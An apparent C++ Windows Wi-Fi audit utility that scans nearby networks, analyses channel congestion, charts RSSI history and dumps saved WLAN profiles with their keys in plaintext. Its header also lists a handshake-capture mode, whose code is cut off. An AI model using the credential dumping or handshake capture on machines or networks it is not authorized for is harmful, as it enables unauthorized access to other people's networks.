// language: C++, file: WiFiAudit.cpp, target: Windows 11, MSVC
// build: cl /std:c++20 /EHsc /O2 WiFiAudit.cpp wlanapi.lib ole32.lib iphlpapi.lib ws2_32.lib
// admin recommended — plaintext keys + ARP table + monitor mode need elevation.
//
// options:
//   1  my wifi        -> Results/MiWIfi/
//   2  neighbors      -> Results/Near Wifis/
//   3  both           -> Results/MiWIfi and Near Wifis/
//   4  channels       -> Results/Channels/
//   5  history        -> Results/History/rssi_timeline.html  (self-contained)
//   6  handshake [hw] -> Results/Handshakes/
//   7  clients   [hw] -> Results/Clients/
//
// CLI: wifiaudit.exe --my --format txt,json,html --out Results
//      wifiaudit.exe --both --format all
//      wifiaudit.exe --history
//      wifiaudit.exe --handshake --ssid NAME --bssid MAC --channel N

#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wlanapi.h>
#include <iphlpapi.h>
#include <objbase.h>

#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <algorithm>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <ctime>
#include <filesystem>
#include <thread>
#include <chrono>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

namespace fs = std::filesystem;

// ============================================================
// helpers
// ============================================================

static std::string wide_to_utf8(const wchar_t* w) {
    if (!w) return {};
    int len = WideCharToMultiByte(CP_UTF8, 0, w, -1, nullptr, 0, nullptr, nullptr);
    if (len <= 1) return {};
    std::string out(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, w, -1, out.data(), len, nullptr, nullptr);
    return out;
}

static std::string extract_tag(const std::wstring& xml, const std::wstring& tag) {
    std::wstring open  = L"<" + tag + L">";
    std::wstring close = L"</" + tag + L">";
    size_t s = xml.find(open);
    if (s == std::wstring::npos) return {};
    s += open.size();
    size_t e = xml.find(close, s);
    if (e == std::wstring::npos) return {};
    return wide_to_utf8(xml.substr(s, e - s).c_str());
}

static std::string ssid_str(const DOT11_SSID& s) {
    return std::string(reinterpret_cast<const char*>(s.ucSSID), s.uSSIDLength);
}

#ifndef DOT11_AUTH_ALGO_WPA3
#define DOT11_AUTH_ALGO_WPA3 8
#endif
#ifndef DOT11_AUTH_ALGO_WPA3_SAE
#define DOT11_AUTH_ALGO_WPA3_SAE 9
#endif
#ifndef DOT11_AUTH_ALGO_OWE
#define DOT11_AUTH_ALGO_OWE 10
#endif
#ifndef DOT11_AUTH_ALGO_WPA3_ENT
#define DOT11_AUTH_ALGO_WPA3_ENT 11
#endif

static const char* auth_str(DOT11_AUTH_ALGORITHM a) {
    switch (a) {
    case DOT11_AUTH_ALGO_80211_OPEN:       return "OPEN";
    case DOT11_AUTH_ALGO_80211_SHARED_KEY: return "WEP-SHARED";
    case DOT11_AUTH_ALGO_WPA:              return "WPA-ENT";
    case DOT11_AUTH_ALGO_WPA_PSK:          return "WPA-PSK";
    case DOT11_AUTH_ALGO_WPA_NONE:         return "WPA-NONE";
    case DOT11_AUTH_ALGO_RSNA:             return "WPA2-ENT";
    case DOT11_AUTH_ALGO_RSNA_PSK:         return "WPA2-PSK";
    case (DOT11_AUTH_ALGORITHM)DOT11_AUTH_ALGO_WPA3:     return "WPA3";
    case (DOT11_AUTH_ALGORITHM)DOT11_AUTH_ALGO_WPA3_SAE: return "WPA3-SAE";
    case (DOT11_AUTH_ALGORITHM)DOT11_AUTH_ALGO_OWE:      return "OWE";
    case (DOT11_AUTH_ALGORITHM)DOT11_AUTH_ALGO_WPA3_ENT: return "WPA3-ENT";
    default:                               return "UNKNOWN";
    }
}

static const char* cipher_str(DOT11_CIPHER_ALGORITHM c) {
    switch (c) {
    case DOT11_CIPHER_ALGO_NONE:   return "NONE";
    case DOT11_CIPHER_ALGO_WEP40:  return "WEP40";
    case DOT11_CIPHER_ALGO_TKIP:   return "TKIP";
    case DOT11_CIPHER_ALGO_CCMP:   return "CCMP";
    case DOT11_CIPHER_ALGO_WEP104: return "WEP104";
    case DOT11_CIPHER_ALGO_WEP:    return "WEP";
    case DOT11_CIPHER_ALGO_GCMP:   return "GCMP";
    default:                       return "UNKNOWN";
    }
}

static const char* bss_type_str(DOT11_BSS_TYPE t) {
    switch (t) {
    case dot11_BSS_type_infrastructure: return "infra";
    case dot11_BSS_type_independent:    return "adhoc";
    case dot11_BSS_type_any:            return "any";
    default:                            return "?";
    }
}

static bool is_admin() {
    BOOL admin = FALSE;
    PSID grp = nullptr;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &grp)) {
        CheckTokenMembership(nullptr, grp, &admin);
        FreeSid(grp);
    }
    return admin == TRUE;
}

static std::string human_timestamp() {
    std::time_t t = std::time(nullptr);
    std::tm lt{};
    localtime_s(&lt, &t);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &lt);
    return buf;
}

static std::string fs_timestamp() {
    std::time_t t = std::time(nullptr);
    std::tm lt{};
    localtime_s(&lt, &t);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%Y-%m-%d_%H-%M-%S", &lt);
    return buf;
}

static std::string iso_timestamp() {
    std::time_t t = std::time(nullptr);
    std::tm lt{};
    localtime_s(&lt, &t);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%S", &lt);
    return buf;
}

static std::string bssid_str(const DOT11_MAC_ADDRESS& m) {
    char b[18];
    std::snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
                  m[0], m[1], m[2], m[3], m[4], m[5]);
    return b;
}

static int freq_to_channel(int khz) {
    int mhz = khz / 1000;
    if (mhz == 2484) return 14;
    if (mhz >= 2412 && mhz <= 2472) return (mhz - 2412) / 5 + 1;
    if (mhz >= 5160 && mhz <= 5895) return (mhz - 5000) / 5;
    if (mhz >= 5925 && mhz <= 7125) return (mhz - 5950) / 5 + 1;
    return 0;
}

static const char* freq_to_band(int khz) {
    int mhz = khz / 1000;
    if (mhz < 2500) return "2.4G";
    if (mhz >= 5000 && mhz < 5900) return "5G";
    if (mhz >= 5925) return "6G";
    return "?";
}

static std::string json_escape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (unsigned char c : s) {
        switch (c) {
        case '"':  out += "\\\""; break;
        case '\\': out += "\\\\"; break;
        case '\n': out += "\\n";  break;
        case '\r': out += "\\r";  break;
        case '\t': out += "\\t";  break;
        default:
            if (c < 0x20) {
                char buf[8];
                std::snprintf(buf, sizeof(buf), "\\u%04x", c);
                out += buf;
            } else out += c;
        }
    }
    return out;
}

static std::string html_escape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        switch (c) {
        case '<': out += "&lt;";   break;
        case '>': out += "&gt;";   break;
        case '&': out += "&amp;";  break;
        case '"': out += "&quot;"; break;
        default:  out += c;
        }
    }
    return out;
}

// ============================================================
// BssRecord
// ============================================================

struct BssRecord {
    std::string ssid;
    std::string bssid;
    int rssi = 0;
    int freq_khz = 0;
    int channel = 0;
    std::string band;
    std::string bss_type;
};

// ============================================================
// Report
// ============================================================

struct Section {
    std::string name;
    bool tabular = false;
    std::vector<std::string> columns;
    std::vector<std::vector<std::string>> rows;
    std::vector<std::string> text_lines;
};

class Report {
public:
    std::string option;
    std::string ts_human;
    std::string ts_iso;
    std::string ts_fs;
    std::vector<Section> sections;

    Report(const std::string& opt)
        : option(opt), ts_human(human_timestamp()),
          ts_iso(iso_timestamp()), ts_fs(fs_timestamp()) {}

    Section& text_section(const std::string& name) {
        sections.push_back({name});
        return sections.back();
    }
    Section& table_section(const std::string& name,
                           std::vector<std::string> cols) {
        Section s;
        s.name = name;
        s.tabular = true;
        s.columns = std::move(cols);
        sections.push_back(std::move(s));
        return sections.back();
    }

    bool write_txt(const fs::path& p) {
        std::ofstream f(p);
        if (!f) return false;
        f << "========================================\n";
        f << " " << option << " — " << ts_human << "\n";
        f << "========================================\n\n";
        for (auto& s : sections) {
            f << "[" << s.name << "]\n";
            for (auto& l : s.text_lines) f << l << "\n";
            if (s.tabular) {
                for (auto& r : s.rows) {
                    for (size_t i = 0; i < r.size(); ++i) {
                        if (i) f << " | ";
                        f << r[i];
                    }
                    f << "\n";
                }
            }
            f << "\n";
        }
        f << "end of report — " << human_timestamp() << "\n";
        return true;
    }

    bool write_json(const fs::path& p) {
        std::ofstream f(p);
        if (!f) return false;
        f << "{\n";
        f << "  \"option\": \"" << json_escape(option) << "\",\n";
        f << "  \"generated_iso\": \"" << ts_iso << "\",\n";
        f << "  \"generated_human\": \"" << json_escape(ts_human) << "\",\n";
        f << "  \"sections\": [\n";
        for (size_t si = 0; si < sections.size(); ++si) {
            auto& s = sections[si];
            f << "    {\n";
            f << "      \"name\": \"" << json_escape(s.name) << "\",\n";
            f << "      \"tabular\": " << (s.tabular ? "true" : "false") << ",\n";
            if (s.tabular) {
                f << "      \"columns\": [";
                for (size_t i = 0; i < s.columns.size(); ++i) {
                    if (i) f << ",";
                    f << "\"" << json_escape(s.columns[i]) << "\"";
                }
                f << "],\n";
                f << "      \"rows\": [\n";
                for (size_t ri = 0; ri < s.rows.size(); ++ri) {
                    f << "        {";
                    for (size_t i = 0; i < s.rows[ri].size(); ++i) {
                        if (i) f << ",";
                        std::string key = (i < s.columns.size()) ? s.columns[i] :
                                          ("col" + std::to_string(i));
                        f << "\"" << json_escape(key) << "\": \""
                          << json_escape(s.rows[ri][i]) << "\"";
                    }
                    f << "}" << (ri + 1 < s.rows.size() ? "," : "");
                    f << "\n";
                }
                f << "      ]\n";
            } else {
                f << "      \"lines\": [";
                for (size_t i = 0; i < s.text_lines.size(); ++i) {
                    if (i) f << ",";
                    f << "\n        \"" << json_escape(s.text_lines[i]) << "\"";
                }
                f << "\n      ]\n";
            }
            f << "    }" << (si + 1 < sections.size() ? "," : "") << "\n";
        }
        f << "  ]\n";
        f << "}\n";
        return true;
    }

    bool write_html(const fs::path& p) {
        std::ofstream f(p);
        if (!f) return false;
        f << "<!DOCTYPE html>\n<html lang=\"en\"><head><meta charset=\"utf-8\">\n";
        f << "<title>" << html_escape(option) << " — " << ts_human << "</title>\n";
        f << "<style>\n"
             "body{font-family:Segoe UI,system-ui,sans-serif;background:#0e1116;"
             "color:#d6deeb;margin:0;padding:24px;}\n"
             "h1{font-size:20px;margin:0 0 4px;color:#82aaff;}\n"
             ".meta{color:#637777;font-size:12px;margin-bottom:24px;}\n"
             "section{margin:24px 0;padding:16px;background:#131820;"
             "border:1px solid #1f2933;border-radius:6px;}\n"
             "h2{font-size:14px;text-transform:uppercase;letter-spacing:1px;"
             "color:#7fdbca;margin:0 0 12px;}\n"
             "table{width:100%;border-collapse:collapse;font-size:13px;}\n"
             "th{text-align:left;padding:6px 10px;background:#1a2029;"
             "color:#82aaff;border-bottom:1px solid #2d3748;font-weight:600;}\n"
             "td{padding:5px 10px;border-bottom:1px solid #1a2029;}\n"
             "tr:hover td{background:#1a2029;}\n"
             "pre{margin:0;font-family:Consolas,monospace;font-size:12px;"
             "color:#c3cee3;white-space:pre-wrap;}\n"
             "</style></head><body>\n";
        f << "<h1>" << html_escape(option) << "</h1>\n";
        f << "<div class=\"meta\">" << html_escape(ts_human) << "</div>\n";

        for (auto& s : sections) {
            f << "<section><h2>" << html_escape(s.name) << "</h2>\n";
            if (s.tabular) {
                f << "<table><thead><tr>";
                for (auto& c : s.columns) f << "<th>" << html_escape(c) << "</th>";
                f << "</tr></thead><tbody>\n";
                for (auto& r : s.rows) {
                    f << "<tr>";
                    for (auto& v : r) f << "<td>" << html_escape(v) << "</td>";
                    f << "</tr>\n";
                }
                f << "</tbody></table>\n";
            } else {
                f << "<pre>";
                for (auto& l : s.text_lines) f << html_escape(l) << "\n";
                f << "</pre>\n";
            }
            f << "</section>\n";
        }
        f << "</body></html>\n";
        return true;
    }
};

// ============================================================
// report path
// ============================================================

static fs::path next_report_base(const fs::path& dir) {
    std::error_code ec;
    fs::create_directories(dir, ec);

    int count = 0;
    if (fs::exists(dir)) {
        for (auto& e : fs::directory_iterator(dir, ec)) {
            if (ec) break;
            if (e.is_regular_file() && e.path().extension() == ".txt")
                ++count;
        }
    }
    std::string base;
    if (count == 0) base = "ScanReport_" + fs_timestamp();
    else            base = "Generated" + std::to_string(count + 1) + "_" + fs_timestamp();
    return dir / base;
}

// ============================================================
// WlanCtx
// ============================================================

struct WlanCtx {
    HANDLE h = nullptr;
    PWLAN_INTERFACE_INFO_LIST ifs = nullptr;
    ~WlanCtx() {
        if (ifs) WlanFreeMemory(ifs);
        if (h)   WlanCloseHandle(h, nullptr);
    }
    bool open() {
        DWORD ver = 0;
        if (WlanOpenHandle(2, nullptr, &ver, &h) != ERROR_SUCCESS) return false;
        if (WlanEnumInterfaces(h, nullptr, &ifs) != ERROR_SUCCESS) return false;
        return true;
    }
};

// ============================================================
// my wifi
// ============================================================

static void dump_current(Report& r, HANDLE h, const GUID& iface) {
    PWLAN_CONNECTION_ATTRIBUTES ca = nullptr;
    DWORD sz = 0;
    WLAN_OPCODE_VALUE_TYPE op = wlan_opcode_value_type_invalid;
    DWORD rc = WlanQueryInterface(h, &iface, wlan_intf_opcode_current_connection,
                                  nullptr, &sz, (PVOID*)&ca, &op);

    auto& s = r.text_section("current connection");
    if (rc != ERROR_SUCCESS || !ca) {
        s.text_lines.push_back("  not connected");
        return;
    }
    std::string ssid = ssid_str(ca->wlanAssociationAttributes.dot11Ssid);
    if (ssid.empty()) ssid = "<hidden>";

    s.text_lines.push_back("  ssid     : " + ssid);
    s.text_lines.push_back("  bssid    : " + bssid_str(ca->wlanAssociationAttributes.dot11Bssid));
    s.text_lines.push_back("  auth     : " + std::string(auth_str(ca->wlanSecurityAttributes.dot11AuthAlgorithm)));
    s.text_lines.push_back("  cipher   : " + std::string(cipher_str(ca->wlanSecurityAttributes.dot11CipherAlgorithm)));
    s.text_lines.push_back("  signal   : " + std::to_string((int)ca->wlanAssociationAttributes.wlanSignalQuality) + "%");
    s.text_lines.push_back("  rx/tx    : " + std::to_string(ca->wlanAssociationAttributes.ulRxRate)
                            + " / " + std::to_string(ca->wlanAssociationAttributes.ulTxRate) + " kbps");
    WlanFreeMemory(ca);
}

static void dump_saved(Report& r, HANDLE h, const GUID& iface) {
    PWLAN_PROFILE_INFO_LIST list = nullptr;
    if (WlanGetProfileList(h, &iface, nullptr, &list) != ERROR_SUCCESS) return;

    auto& s = r.text_section("saved profiles");

    for (DWORD i = 0; i < list->dwNumberOfItems; ++i) {
        auto& p = list->ProfileInfo[i];
        LPWSTR xml = nullptr;
        DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
        DWORD access = 0;
        DWORD rc = WlanGetProfile(h, &iface, p.strProfileName, nullptr,
                                  &xml, &flags, &access);
        s.text_lines.push_back("  profile : " + wide_to_utf8(p.strProfileName));
        if (rc != ERROR_SUCCESS || !xml) {
            s.text_lines.push_back("    [!] read failed rc=" + std::to_string(rc));
            if (xml) WlanFreeMemory(xml);
            continue;
        }
        std::wstring wxml(xml);
        std::string ssid   = extract_tag(wxml, L"name");
        std::string auth   = extract_tag(wxml, L"authentication");
        std::string enc    = extract_tag(wxml, L"encryption");
        std::string keymat = extract_tag(wxml, L"keyMaterial");
        std::string keytyp = extract_tag(wxml, L"keyType");

        s.text_lines.push_back("    ssid   : " + ssid);
        s.text_lines.push_back("    auth   : " + auth + "  enc: " + enc);
        if (!keymat.empty())
            s.text_lines.push_back("    key    : " + keymat + "   (" +
                                    (keytyp.empty() ? "?" : keytyp) + ")");
        else
            s.text_lines.push_back("    key    : <empty — 802.1X / not stored>");
        s.text_lines.push_back("");
        WlanFreeMemory(xml);
    }
    WlanFreeMemory(list);
}

static void dump_lan(Report& r) {
    std::system("ping -n 1 -w 200 255.255.255.255 > nul 2>&1");
    ULONG size = 0;
    GetIpNetTable(nullptr, &size, FALSE);
    auto& s = r.table_section("lan devices (arp)", {"ip","mac","type"});
    if (size == 0) { s.rows.push_back({"<empty>","",""}); return; }
    std::vector<BYTE> buf(size);
    auto* table = reinterpret_cast<PMIB_IPNETTABLE>(buf.data());
    if (GetIpNetTable(table, &size, FALSE) != NO_ERROR) return;
    for (DWORD i = 0; i < table->dwNumEntries; ++i) {
        auto& row = table->table[i];
        IN_ADDR ip{}; ip.S_un.S_addr = row.dwAddr;
        char ipb[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &ip, ipb, sizeof(ipb));
        char mac[20];
        std::snprintf(mac, sizeof(mac), "%02X-%02X-%02X-%02X-%02X-%02X",
                      row.bPhysAddr[0], row.bPhysAddr[1], row.bPhysAddr[2],
                      row.bPhysAddr[3], row.bPhysAddr[4], row.bPhysAddr[5]);
        const char* type = "other";
        switch (row.dwType) {
        case MIB_IPNET_TYPE_DYNAMIC: type = "dynamic"; break;
        case MIB_IPNET_TYPE_STATIC:  type = "static";  break;
        case MIB_IPNET_TYPE_INVALID: type = "invalid"; break;
        }
        s.rows.push_back({ipb, mac, type});
    }
}

static void collect_my_wifi(Report& r) {
    WlanCtx ctx;
    if (!ctx.open()) {
        auto& s = r.text_section("error");
        s.text_lines.push_back("[!] WLAN API failed — WlanSvc stopped?");
        return;
    }
    for (DWORD i = 0; i < ctx.ifs->dwNumberOfItems; ++i) {
        auto& info = ctx.ifs->InterfaceInfo[i];
        auto& s = r.text_section("interface: " + wide_to_utf8(info.strInterfaceDescription));
        (void)s;
        dump_current(r, ctx.h, info.InterfaceGuid);
        dump_saved  (r, ctx.h, info.InterfaceGuid);
    }
    dump_lan(r);
}

// ============================================================
// neighbors
// ============================================================

static std::vector<BssRecord> collect_bss() {
    std::vector<BssRecord> out;
    WlanCtx ctx;
    if (!ctx.open()) return out;

    for (DWORD i = 0; i < ctx.ifs->dwNumberOfItems; ++i) {
        WlanScan(ctx.h, &ctx.ifs->InterfaceInfo[i].InterfaceGuid,
                 nullptr, nullptr, nullptr);
    }
    Sleep(3000);

    for (DWORD i = 0; i < ctx.ifs->dwNumberOfItems; ++i) {
        PWLAN_BSS_LIST bss = nullptr;
        if (WlanGetNetworkBssList(ctx.h, &ctx.ifs->InterfaceInfo[i].InterfaceGuid,
                                  nullptr, dot11_BSS_type_any, FALSE, nullptr, &bss)
            != ERROR_SUCCESS || !bss) continue;
        for (DWORD k = 0; k < bss->dwNumberOfItems; ++k) {
            auto& b = bss->wlanBssEntries[k];
            BssRecord rec;
            rec.ssid = ssid_str(b.dot11Ssid);
            if (rec.ssid.empty()) rec.ssid = "<hidden>";
            rec.bssid = bssid_str(b.dot11Bssid);
            rec.rssi = (int)b.lRssi;
            rec.freq_khz = (int)b.ulChCenterFrequency;
            rec.channel = freq_to_channel(rec.freq_khz);
            rec.band = freq_to_band(rec.freq_khz);
            rec.bss_type = bss_type_str(b.dot11BssType);
            out.push_back(std::move(rec));
        }
        WlanFreeMemory(bss);
    }
    return out;
}

static void collect_neighbors(Report& r) {
    auto bss = collect_bss();
    auto& s = r.table_section("bss list",
        {"ssid","bssid","rssi","freq_khz","channel","band","type"});
    for (auto& b : bss) {
        s.rows.push_back({
            b.ssid, b.bssid, std::to_string(b.rssi),
            std::to_string(b.freq_khz), std::to_string(b.channel),
            b.band, b.bss_type
        });
    }
}

// ============================================================
// channels
// ============================================================

static void collect_channels(Report& r) {
    auto bss = collect_bss();
    if (bss.empty()) {
        auto& s = r.text_section("channels");
        s.text_lines.push_back("  no BSS found — is the radio associated?");
        return;
    }

    std::map<int, std::vector<const BssRecord*>> by_ch;
    for (auto& b : bss) by_ch[b.channel].push_back(&b);

    {
        auto& s = r.table_section("all bss by channel",
            {"channel","band","count","rssi_avg","networks"});
        for (auto& [ch, list] : by_ch) {
            int sum = 0, n = 0;
            std::string names;
            for (auto* b : list) {
                sum += b->rssi; ++n;
                if (!names.empty()) names += ", ";
                names += b->ssid;
            }
            s.rows.push_back({
                std::to_string(ch),
                list.empty() ? "?" : list[0]->band,
                std::to_string(n),
                std::to_string(n ? sum / n : 0),
                names
            });
        }
    }

    {
        auto& s = r.text_section("2.4 ghz overlap analysis");
        int c1 = (int)by_ch[1].size();
        int c6 = (int)by_ch[6].size();
        int c11 = (int)by_ch[11].size();
        s.text_lines.push_back("  ch  1 : " + std::to_string(c1) + " networks");
        s.text_lines.push_back("  ch  6 : " + std::to_string(c6) + " networks");
        s.text_lines.push_back("  ch 11 : " + std::to_string(c11) + " networks");
        int best = 1; int best_n = c1;
        if (c6  < best_n) { best = 6;  best_n = c6;  }
        if (c11 < best_n) { best = 11; best_n = c11; }
        s.text_lines.push_back("");
        s.text_lines.push_back("  cleanest non-overlapping 2.4g channel: " +
                               std::to_string(best) + " (" +
                               std::to_string(best_n) + " networks)");
    }

    {
        auto& s = r.text_section("5 ghz recommendation");
        std::vector<std::pair<int, int>> ranked;
        for (auto& [ch, list] : by_ch) {
            if (ch < 36) continue;
            if (ch >= 52 && ch <= 64) continue;
            if (ch >= 100 && ch <= 144) continue;
            ranked.push_back({(int)list.size(), ch});
        }
        std::sort(ranked.begin(), ranked.end());
        if (ranked.empty()) {
            s.text_lines.push_back("  no non-dfs 5g channels in range");
        } else {
            for (size_t i = 0; i < ranked.size() && i < 5; ++i) {
                s.text_lines.push_back("  ch " + std::to_string(ranked[i].second) +
                                       " : " + std::to_string(ranked[i].first) +
                                       " networks");
            }
            s.text_lines.push_back("");
            s.text_lines.push_back("  best non-dfs 5g candidate: ch " +
                                   std::to_string(ranked[0].second));
        }
    }
}

// ============================================================
// history — self-contained HTML, no CSV
// ============================================================

static void collect_history(Report& r, const fs::path& base) {
    struct Sample {
        std::string ts, bssid, ssid, band;
        int rssi = 0, freq_khz = 0, channel = 0;
    };

    fs::path dir = base / "History";
    std::error_code ec;
    fs::create_directories(dir, ec);
    fs::path html_path = dir / "rssi_timeline.html";

    std::vector<Sample> all;

    // --- read prior samples from the html if it exists ---
    if (fs::exists(html_path)) {
        std::ifstream in(html_path);
        std::stringstream buf;
        buf << in.rdbuf();
        std::string html = buf.str();

        const std::string start_marker = "<script id=\"rssi-data\" type=\"text/plain\">";
        const std::string end_marker = "</script>";
        size_t a = html.find(start_marker);
        if (a != std::string::npos) {
            a += start_marker.size();
            size_t b = html.find(end_marker, a);
            if (b != std::string::npos) {
                std::string data = html.substr(a, b - a);
                std::istringstream lines(data);
                std::string ln;
                while (std::getline(lines, ln)) {
                    if (ln.empty()) continue;
                    std::vector<std::string> f;
                    std::string cur;
                    for (char c : ln) {
                        if (c == '\t') { f.push_back(cur); cur.clear(); }
                        else if (c != '\r') cur += c;
                    }
                    f.push_back(cur);
                    if (f.size() < 7) continue;
                    Sample s;
                    s.ts       = f[0];
                    s.bssid    = f[1];
                    s.ssid     = f[2];
                    s.rssi     = std::atoi(f[3].c_str());
                    s.freq_khz = std::atoi(f[4].c_str());
                    s.channel  = std::atoi(f[5].c_str());
                    s.band     = f[6];
                    all.push_back(std::move(s));
                }
            }
        }
    }

    // --- append a fresh sample set from the current scan ---
    auto bss = collect_bss();
    std::string now = fs_timestamp();
    for (auto& b : bss) {
        Sample s;
        s.ts = now;
        s.bssid = b.bssid;
        s.ssid = b.ssid;
        s.rssi = b.rssi;
        s.freq_khz = b.freq_khz;
        s.channel = b.channel;
        s.band = b.band;
        all.push_back(std::move(s));
    }

    // --- group by bssid for the render ---
    std::map<std::string, std::vector<std::pair<std::string,int>>> by_bssid;
    std::map<std::string, std::string> ssid_of;
    for (auto& s : all) {
        by_bssid[s.bssid].push_back({s.ts, s.rssi});
        ssid_of[s.bssid] = s.ssid;
    }

    // --- write the self-contained html ---
    std::ofstream h(html_path);
    if (!h) {
        auto& sec = r.text_section("history");
        sec.text_lines.push_back("  [!] cannot write " + html_path.string());
        return;
    }

    h << "<!DOCTYPE html><html><head><meta charset=\"utf-8\">\n"
         "<title>RSSI timeline</title>\n"
         "<script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>\n"
         "<style>\n"
         "body{background:#0e1116;color:#d6deeb;font-family:Segoe UI,system-ui,sans-serif;"
         "margin:0;padding:24px;}\n"
         "h1{color:#82aaff;font-size:20px;margin:0 0 4px;}\n"
         "h2{color:#7fdbca;font-size:14px;text-transform:uppercase;letter-spacing:1px;"
         "margin:32px 0 12px;}\n"
         ".meta{color:#637777;font-size:12px;margin-bottom:24px;}\n"
         "canvas{max-height:60vh;background:#131820;border:1px solid #1f2933;"
         "border-radius:6px;padding:12px;}\n"
         "table{width:100%;border-collapse:collapse;font-size:13px;"
         "background:#131820;border:1px solid #1f2933;border-radius:6px;overflow:hidden;}\n"
         "th{text-align:left;padding:8px 12px;background:#1a2029;color:#82aaff;"
         "font-weight:600;border-bottom:1px solid #2d3748;cursor:pointer;user-select:none;}\n"
         "th:hover{background:#202834;}\n"
         "td{padding:6px 12px;border-bottom:1px solid #1a2029;font-variant-numeric:tabular-nums;}\n"
         "tr:hover td{background:#1a2029;}\n"
         ".rssi-strong{color:#7fdbca;font-weight:600;}\n"
         ".rssi-weak{color:#e06c75;}\n"
         "</style></head><body>\n";

    h << "<h1>RSSI timeline</h1>\n";
    h << "<div class=\"meta\">" << json_escape(human_timestamp())
      << " · " << all.size() << " samples · "
      << by_bssid.size() << " bssids</div>\n";
    h << "<canvas id=\"c\"></canvas>\n";
    h << "<h2>Resumen por BSSID</h2>\n";
    h << "<table id=\"t\"><thead><tr>"
         "<th onclick=\"sortTable(0)\">BSSID</th>"
         "<th onclick=\"sortTable(1)\">SSID</th>"
         "<th onclick=\"sortTable(2)\">Muestras</th>"
         "<th onclick=\"sortTable(3)\">Último RSSI</th>"
         "<th onclick=\"sortTable(4)\">Promedio</th>"
         "<th onclick=\"sortTable(5)\">Mín</th>"
         "<th onclick=\"sortTable(6)\">Máx</th>"
         "</tr></thead><tbody>\n";

    for (auto& [bssid, samples] : by_bssid) {
        if (samples.empty()) continue;
        int sum = 0, mn = 0, mx = -200;
        for (auto& p : samples) {
            sum += p.second;
            if (p.second < mn) mn = p.second;
            if (p.second > mx) mx = p.second;
        }
        int avg = sum / (int)samples.size();
        int last = samples.back().second;
        std::string cls = last > -60 ? "rssi-strong" : (last < -85 ? "rssi-weak" : "");
        h << "<tr>"
          << "<td>" << json_escape(bssid) << "</td>"
          << "<td>" << json_escape(ssid_of[bssid]) << "</td>"
          << "<td>" << samples.size() << "</td>"
          << "<td class=\"" << cls << "\">" << last << "</td>"
          << "<td>" << avg << "</td>"
          << "<td>" << mn << "</td>"
          << "<td>" << mx << "</td>"
          << "</tr>\n";
    }
    h << "</tbody></table>\n";

    // embedded data block — consumed on the next run
    h << "<script id=\"rssi-data\" type=\"text/plain\">\n";
    for (auto& s : all) {
        h << s.ts << "\t" << s.bssid << "\t" << s.ssid << "\t"
          << s.rssi << "\t" << s.freq_khz << "\t" << s.channel << "\t" << s.band << "\n";
    }
    h << "</script>\n";

    h << "<script>\nconst datasets = [\n";
    bool first = true;
    for (auto& [bssid, samples] : by_bssid) {
        if (!first) h << ",\n";
        first = false;
        h << "  {label:\"" << json_escape(ssid_of[bssid]) << " (" << bssid << ")\",";
        h << " data:[";
        for (size_t i = 0; i < samples.size(); ++i) {
            if (i) h << ",";
            h << "{x:\"" << samples[i].first << "\",y:" << samples[i].second << "}";
        }
        h << "], borderWidth:1.5, tension:0.3, pointRadius:0}";
    }
    h << "\n];\n"
         "new Chart(document.getElementById('c'),{type:'line',"
         "data:{datasets:datasets},"
         "options:{parsing:false,animation:false,"
         "scales:{"
         "x:{type:'category',ticks:{maxTicksLimit:12,color:'#637777'},"
         "grid:{color:'#1a2029'}},"
         "y:{min:-100,max:0,title:{display:true,text:'RSSI dBm',color:'#637777'},"
         "ticks:{color:'#637777'},grid:{color:'#1a2029'}}},"
         "plugins:{legend:{labels:{color:'#d6deeb',boxWidth:10,font:{size:11}}}}}});\n"
         "function sortTable(n){"
         "var t=document.getElementById('t'),rows=Array.from(t.tBodies[0].rows);"
         "var asc=t.dataset.sort!==String(n);"
         "rows.sort(function(a,b){"
         "var x=a.cells[n].innerText,y=b.cells[n].innerText;"
         "var nx=parseFloat(x),ny=parseFloat(y);"
         "if(!isNaN(nx)&&!isNaN(ny))return asc?nx-ny:ny-nx;"
         "return asc?x.localeCompare(y):y.localeCompare(x);});"
         "rows.forEach(function(t){t.tBodies[0].appendChild(t);});"
         "t.dataset.sort=String(n);}\n"
         "</script></body></html>\n";

    auto& sec = r.text_section("history");
    sec.text_lines.push_back("  -> wrote " + html_path.string());
    sec.text_lines.push_back("  samples total : " + std::to_string(all.size()));
    sec.text_lines.push_back("  unique bssids : " + std::to_string(by_bssid.size()));
}

// ============================================================
// process helpers
// ============================================================

static bool file_exists(const std::string& p) {
    std::error_code ec;
    return fs::exists(p, ec);
}

static std::string which(const std::string& exe) {
    char buf[MAX_PATH];
    DWORD n = SearchPathA(nullptr, exe.c_str(), ".exe", MAX_PATH, buf, nullptr);
    if (n == 0 || n >= MAX_PATH) return {};
    return std::string(buf);
}

static int run_wait(const std::string& cmd, DWORD timeout_ms = 600000) {
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::vector<char> buf(cmd.begin(), cmd.end());
    buf.push_back('\0');
    if (!CreateProcessA(nullptr, buf.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return -1;
    DWORD r = WaitForSingleObject(pi.hProcess, timeout_ms);
    DWORD rc = (DWORD)-1;
